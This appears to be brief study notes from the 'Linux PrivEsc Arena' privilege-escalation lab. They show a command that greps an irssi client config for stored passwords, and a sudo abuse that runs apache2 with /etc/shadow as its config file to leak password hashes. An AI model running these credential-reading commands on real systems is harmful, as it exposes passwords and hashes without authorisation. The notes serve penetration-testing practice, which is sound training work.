# Linux PrivEsc Arena

### Stored passw

```bash
cat /home/user/.irssi/config | grep -i passw

cat /home/user/.irssi/config | grep -i passw
```

### Sudo (Abusing Intended Functionality)
1. In command prompt type: sudo -l
2. From the output, notice the list of programs that can run via sudo.
```bash
sudo apache2 -f /etc/shadow
```